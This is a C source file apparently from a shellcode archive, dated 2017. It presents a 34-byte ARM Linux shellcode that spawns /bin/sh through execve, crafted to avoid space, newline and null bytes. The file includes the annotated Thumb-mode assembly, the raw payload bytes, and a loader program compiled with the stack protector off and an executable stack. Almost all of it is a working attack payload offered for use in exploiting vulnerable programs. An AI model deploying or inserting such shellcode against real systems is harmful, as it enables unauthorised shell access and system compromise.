/*
Title:  Linux/ARM - execve("/bin/sh", NULL, 0) - 34 bytes
Date:   2017-03-31
Tested: armv7l
Author: Jonathan 'dummys' Borgeaud - twitter: @dummys1337
fapperz.org

Shellcode ARM without 0x20, 0x0a and 0x00

assembly shellcode: as -o sc.o sc.s

.syntax unified
.global main
.code 32
main:
    add  r3, pc, #1      /* add 0x1 to pc to prepare the switch to thumb mode */
    bx   r3              /* switch to thumb mode */
.thumb
    mov  r0, pc          /* move pc to r0 */
    adds r0, #14         /* make r0 to point to /bin//sh */
    str  r0, [sp, #4]    /* store /bin//sh to the stack */
    subs r1, r1, r1      /* put 0 in r1 */
    subs r2, r2, r2      /* put 0 in r2 */
    movs r7, #8          /* move 8 in r7 */
    str r2, [r0, r7]     /* store nullbytes at the end of /bin//sh */
    adds r7, #3          /* add 3 to r7 for execve syscall */
    svc  1               /* call execve */
    str  r7, [r5, #32]   /* thumb instruction for "/b" string */
    ldr  r1, [r5, #100]  /* thumb instruction for "in" string */
    cmp  r7, #0x2f       /* thumb instruction for "//" string */
    ldr  r3, [r6, #4]    /* thumb instruction for "sh" string */


compiler c: gcc -marm -fno-stack-protector -z execstack -o loader loader.c

*/

#include <stdio.h>
#include <string.h>

char *SC =      "\x01\x30\x8f\xe2"
                "\x13\xff\x2f\xe1"
                "\x78\x46\x0e\x30"
                "\x01\x90\x49\x1a"
                "\x92\x1a\x08\x27"
                "\xc2\x51\x03\x37"
                "\x01\xdf\x2f\x62"
                "\x69\x6e\x2f\x2f"
                "\x73\x68";

int main(void)
{
    char payload[34];

    memcpy(payload, SC, 34);

    fprintf(stdout, "Length: %d\n", strlen(SC));
    (*(void(*)()) payload) ();

return 0;
}